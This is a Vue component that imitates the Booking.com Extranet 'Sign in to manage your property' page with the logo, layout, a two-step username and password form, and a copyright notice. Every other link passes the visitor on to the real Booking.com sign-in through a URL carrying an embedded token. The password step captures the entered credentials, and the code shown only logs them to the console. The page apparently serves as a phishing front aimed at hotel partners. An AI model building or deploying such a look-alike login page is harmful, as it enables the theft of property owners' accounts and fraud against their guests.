<template>
  <div class="min-h-screen bg-white segoe-ui">
    <!-- Header -->
    <header class="bg-[#003580] text-white min-h-[68px]">
      <div
        class="flex items-center justify-between px-6 py-2 mx-auto max-w-[1108px]"
      >
        <button
          @click="handleDefaultLink"
          rel="noopener noreferrer"
          aria-label="Sign in | Booking.com"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 180 30"
            width="110"
            height="24"
            class="icon-logo"
          >
            <path
              fill="#fff"
              d="M70.6 2.74a2.74 2.74 0 1 1 5.48.02 2.74 2.74 0 0 1-5.48-.02zm45.9 21.03a2.753 2.753 0 0 0 2.548-1.69 2.755 2.755 0 0 0-.59-3.001 2.748 2.748 0 0 0-4.234.412 2.755 2.755 0 0 0 .338 3.47c.513.515 1.21.806 1.938.809zM25.7 6.73a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm39.6-4.12a3.661 3.661 0 0 0-.65-.92l-.15-.16.16-.15c.252-.272.482-.563.69-.87l4.39-6.55h-5.33l-3.31 5.13a1.299 1.299 0 0 1-1.13.41h-.75V2.91c0-1.93-1.21-2.2-2.51-2.2h-2.23v22.87h4.73v-6.86h.44c.54 0 .91.06 1.08.36l2.62 4.89a2.62 2.62 0 0 0 2.82 1.57h3.63l-2.71-4.47-1.79-3.36zm22.97-9.02a6.42 6.42 0 0 0-4.8 2l-.29.29-.1-.4a2.17 2.17 0 0 0-2.38-1.5h-2.13v16.49h4.72v-7.6a6.11 6.11 0 0 1 .29-2 3.86 3.86 0 0 1 3.81-2.89c1.46 0 2 .77 2 2.78v7.19a2.19 2.19 0 0 0 2.51 2.51h2.22V13.07c.03-4.17-2-6.38-5.85-6.38zm-14.88.37h-2.22v16.52h4.7v-14a2.2 2.2 0 0 0-2.48-2.52zm-29.23-.33a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm100.73-13.1a8.549 8.549 0 0 0-1.545 16.942 8.548 8.548 0 0 0 10.185-8.392 8.277 8.277 0 0 0-.585-3.336 8.291 8.291 0 0 0-8.055-5.214zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zM109.74 7.02a2.002 2.002 0 0 0-1.93 1l-.12.25-.22-.19a6.39 6.39 0 0 0-4.33-1.44c-4.39 0-7.36 3.31-7.36 8.23s3.07 8.35 7.45 8.35a5.81 5.81 0 0 0 3.62-1.06l.36-.28v.46c0 2.21-1.43 3.43-4 3.43a9.463 9.463 0 0 1-3.16-.59 1.39 1.39 0 0 0-2 1l-.91 2.28.33.17a12.82 12.82 0 0 0 5.76 1.34c4 0 8.67-2.06 8.67-7.83V7.02h-2.16zm-5.68 12.09c-2.56 0-3.48-2.25-3.48-4.35 0-.93.23-4 3.23-4 1.49 0 3.49.42 3.49 4.1 0 3.52-1.76 4.25-3.24 4.25zm-90.97-7.26l-.69-.38.6-.5a5.54 5.54 0 0 0 1.88-4.31c0-3.6-2.79-5.92-7.09-5.92H2.31A2.4 2.4 0 0 0 0 3.1v20.4h7.88c4.79 0 7.89-2.61 7.89-6.66a5.57 5.57 0 0 0-2.68-4.99zM4.37 6.08c0-1.06.45-1.56 1.43-1.62h2a2.47 2.47 0 0 1 2.68 2.69 2.55 2.55 0 0 1-2.66 2.82H4.37V6.08zM8.2 19.64H4.37v-4.58c0-1 .39-1.49 1.22-1.61H8.2a3.1 3.1 0 0 1 0 6.19zm166.33-12.9a6.478 6.478 0 0 0-5.05 2.45l-.34.44-.27-.49a4.67 4.67 0 0 0-4.45-2.4 6 6 0 0 0-4.33 1.95l-.44.48-.17-.63a2.11 2.11 0 0 0-2.3-1.42h-2v16.45h4.46v-7.26a8.452 8.452 0 0 1 .24-1.92c.43-1.76 1.61-3.65 3.59-3.46 1.22.12 1.82 1.06 1.82 2.89v9.75h4.52v-7.26a6.626 6.626 0 0 1 .25-2c.36-1.67 1.59-3.39 3.5-3.39 1.38 0 1.89.78 1.89 2.89v7.36c0 1.66.74 2.4 2.4 2.4H180v-10.5c0-4.2-1.85-6.33-5.47-6.33zm-40.84 11.12a6.882 6.882 0 0 1-4.48 2.11 4.403 4.403 0 0 1-4.367-2.798 4.394 4.394 0 0 1-.293-1.812 4.35 4.35 0 0 1 2.665-4.382A4.334 4.334 0 0 1 129 10.65c.84 0 1.8.3 1.95.81v.09a1.659 1.659 0 0 0 1.6 1.21H135v-2.15c0-2.84-3.61-3.87-6-3.87-5.19 0-9 3.63-9 8.61 0 4.98 3.73 8.62 8.86 8.62a9.637 9.637 0 0 0 7-3.12L134 17.58l-.31.28z"
            ></path>
          </svg>
        </button>
        <div class="flex items-center gap-2">
          <button
            class="hidden md:flex w-12 h-12 items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 transition-colors rounded-sm"
          >
            <div class="flex items-center gap-1">
              <img
                src="assets/us.png"
                alt="US Flag"
                class="w-6 h-6 rounded-full"
              />
            </div>
          </button>
          <button
            class="hidden md:flex w-12 h-12 items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 rounded-sm transition-colors fill-white"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="20px"
              height="20px"
            >
              <path
                d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0M12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"
              ></path>
            </svg>
          </button>
          <button
            @click="toggleMenu"
            :aria-expanded="isMenuOpen"
            aria-label="Open menu"
            class="md:hidden w-12 h-12 flex items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 rounded-sm transition-colors fill-white"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="22"
              height="22"
            >
              <path
                fill="currentColor"
                d="M3 6h18v2H3V6zm0 5h18v2H3v-2zm0 5h18v2H3v-2z"
              />
            </svg>
          </button>
        </div>
      </div>
    </header>

    <!-- Mobile menu overlay and panel -->
    <transition name="fade">
      <div
        v-if="isMenuOpen"
        class="fixed inset-0 bg-black/40 z-40"
        @click="isMenuOpen = false"
      ></div>
    </transition>
    <transition name="slide-up" mode="fade" appear>
      <nav
        v-if="isMenuOpen"
        class="fixed inset-0 bg-white z-50 flex flex-col"
        role="dialog"
        aria-modal="true"
      >
        <button
          @click="isMenuOpen = false"
          class="p-2 rounded hover:bg-gray-100 text-gray-700 ml-auto mr-2 mt-2 transition-colors duration-300"
          aria-label="Close menu"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            width="20"
            height="20"
          >
            <path
              fill="currentColor"
              d="M18.3 5.71 12 12.01 5.7 5.7 4.29 7.11l6.3 6.3-6.3 6.3 1.41 1.41 6.3-6.3 6.29 6.29 1.41-1.41-6.29-6.29 6.3-6.3z"
            />
          </svg>
        </button>
        <div class="flex items-center justify-between px-6">
          <h2 class="text-2xl font-semibold text-gray-900 mb-2">More</h2>
        </div>
        <div class="p-4">
          <ul class="space-y-3 text-gray-900">
            <li>
              <button
                @click="handleDefaultLink"
                class="w-full flex items-center gap-3 px-2 py-3 rounded hover:bg-gray-50"
              >
                <img
                  src="assets/us.png"
                  alt="US Flag"
                  class="w-6 h-6 rounded-full"
                />
                <span>American English</span>
              </button>
            </li>
          </ul>
        </div>
      </nav>
    </transition>

    <!-- Main Content -->
    <main
      class="flex flex-col items-center min-h-[calc(100vh-64px)] lg:mt-12 px-4 pt-4"
    >
      <div class="w-full max-w-[400px]">
        <Transition :name="stepTransitionName" mode="out-in">
          <!-- Step 1: Username -->
          <div
            v-if="step === 1"
            key="step-1"
            class="flex flex-col justify-center gap-y-4"
          >
            <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
              Sign in to manage your property
            </h1>

            <form @submit.prevent="nextStep">
              <div class="mb-4">
                <label
                  for="username"
                  class="block text-sm font-medium text-gray-900 pb-1"
                >
                  Username
                </label>
                <input
                  id="username"
                  v-model="username"
                  type="text"
                  placeholder='Also known as "Login name" and "Login ID"'
                  class="w-full h-[36px] px-2 py-1 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
                  required
                />
              </div>

              <button
                type="submit"
                class="w-full bg-[#006ce4] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
              >
                Next
              </button>
            </form>

            <div class="text-center mb-0 mt-4">
              <button
                @click="handleDefaultLink"
                class="text-[#0071c2] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
              >
                Having trouble signing in?
              </button>
            </div>

            <div class="mt-6 flex flex-col">
              <hr class="border-gray-200 mb-4" />
              <p class="text-xs text-gray-700">
                Questions about your property or the Extranet? Check out
                <button
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Partner Help
                </button>
                or<br />
                ask another partner in the
                <button
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Partner Community</button
                >.
              </p>
            </div>

            <button
              class="w-full h-12 px-3 flex items-center justify-center bg-white hover:bg-gray-50 text-[#0071c2] font-medium rounded border border-[#0071c2] transition-colors duration-150"
            >
              Create your partner account
            </button>
          </div>

          <!-- Step 2: Password -->
          <div v-else-if="step === 2" class="flex flex-col gap-4">
            <div>
              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
                Enter your password
              </h1>
              <p class="text-sm text-gray-700">
                Enter your Booking.com password for
                <span class="font-bold">{{ username }}</span
                >.
              </p>
            </div>

            <form @submit.prevent="signIn">
              <div class="mb-4">
                <label
                  for="password"
                  class="block text-sm font-medium text-gray-900 mb-1"
                >
                  Password
                </label>
                <div class="relative h-[36px]">
                  <input
                    id="password"
                    v-model="password"
                    :type="showPassword ? 'text' : 'password'"
                    placeholder="Enter your password"
                    class="w-full h-full px-2 py-1 pr-14 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
                    required
                  />
                  <div
                    class="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center"
                  >
                    <button
                      type="button"
                      @click="showPassword = !showPassword"
                      class="p-1.5 text-gray-600 hover:text-gray-800"
                    >
                      <svg
                        v-if="!showPassword"
                        class="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                        />
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                        />
                      </svg>
                      <svg
                        v-else
                        class="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                        />
                      </svg>
                    </button>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
              >
                Sign in
              </button>
            </form>

            <div class="text-center">
              <button
                @click="handleDefaultLink"
                class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
              >
                Forgot your password?
              </button>
            </div>
          </div>
        </Transition>
        <div class="py-4">
          <div
            class="text-center text-[12px] text-gray-600 pt-4 border-t border-gray-200 flex flex-col gap-2"
            style="line-height: 18px"
          >
            <div>
              <p>
                By signing in or creating an account, you agree with our
                <a
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Terms &<br />Conditions
                </a>
                and
                <a
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Privacy Statement
                </a>
              </p>
            </div>
            <div>
              <p>All rights reserved.</p>
              <p>Copyright (2006-2025) – Booking.com™</p>
            </div>
          </div>
        </div>
      </div>
    </main>
  </div>
</template>

<script setup>
import { ref } from 'vue';

const step = ref(1);
const username = ref('');
const password = ref('');
const showPassword = ref(false);
const isMenuOpen = ref(false);
const stepTransitionName = ref('slide-left');

useHead({
  title: 'Sign in - Booking.com',
  meta: [
    { name: 'description', content: 'Sign in to your Booking.com account' },
  ],
});

const defaultLink = ref(
  'https://account.booking.com/sign-in?op_token=EgVvYXV0aCLYAgoUNlo3Mm9IT2QzNk5uN3prM3BpcmgSCWF1dGhvcml6ZRoaaHR0cHM6Ly9hZG1pbi5ib29raW5nLmNvbS8q3wF7InBhZ2UiOiIvaG90ZWwvaG90ZWxhZG1pbi9leHRyYW5ldF9uZy9tYW5hZ2UvYm9va2luZy5odG1sP2NvZGU9YjQ0OTY5ZWExY2E1YTllYmQwNDVlOTQ0YmJhMTI3NmYmbGFuZz1ubCZob3RlbF9pZD0xMDE2NiZyZXNfaWQ9NDk0OTc4NDk5NiZyZXFfaWQ9JmVtYWlsPTEmcmVzcG9uc2U9MSIsImF1dGhfYXR0ZW1wdF9pZCI6ImZiOTNlODVjLTdlYTktNDY5MC1hNGUzLTVlZDA5ZGE5ZGFmYyJ9MitNRVRXLWRZZXdmQklxb055cEp3dVAzNDlzbFk3MkNpS2ZMWjlaYzN3YlE0OgRTMjU2QgRjb2RlKhMwnZPPgJD7JzoAQgBYrMyDm5Mz'
);

const handleDefaultLink = () => {
  navigateTo(defaultLink.value, { external: true });
};

function toggleMenu() {
  isMenuOpen.value = !isMenuOpen.value;
}

function nextStep() {
  if (username.value) {
    stepTransitionName.value = 'slide-left';
    step.value = 2;
  }
}

function signIn() {
  console.log('Signing in with:', {
    username: username.value,
    password: password.value,
  });
}
</script>

<style scoped>
input::placeholder {
  color: #6b7280;
  font-size: 14px;
}

input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus {
  -webkit-box-shadow: 0 0 0px 1000px white inset;
  transition: background-color 5000s ease-in-out 0s;
}
button,
a {
  cursor: pointer;
}

/* Transitions for overlay and panel */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 300ms ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

.slide-up-enter-active,
.slide-up-leave-active {
  transition: transform 300ms ease;
}
.slide-up-enter-from,
.slide-up-leave-to {
  transform: translateY(100%);
}

/* Step transitions */
.slide-left-enter-active,
.slide-left-leave-active,
.slide-right-enter-active,
.slide-right-leave-active {
  transition: transform 300ms cubic-bezier(0.4, 0, 0.2, 1),
    opacity 300ms cubic-bezier(0.4, 0, 0.2, 1);
}

.slide-left-enter-from,
.slide-right-leave-to {
  transform: translateX(100%);
  opacity: 0;
}

.slide-left-leave-to,
.slide-right-enter-from {
  transform: translateX(-100%);
  opacity: 0;
}
</style>
